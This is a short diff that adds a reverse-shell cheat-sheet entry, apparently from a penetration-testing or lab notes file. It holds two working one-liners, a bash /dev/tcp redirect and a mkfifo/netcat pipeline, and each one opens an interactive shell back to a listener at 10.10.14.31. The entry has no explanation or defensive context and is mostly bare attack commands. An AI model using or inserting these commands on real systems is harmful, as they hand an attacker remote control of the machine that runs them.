@@ -1,0 +1,4 @@
+# Bash dev tcp
+bash -i >& /dev/tcp/10.10.14.31/55555 0>&1
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc 10.10.14.31 4444 >/tmp/f
+-----
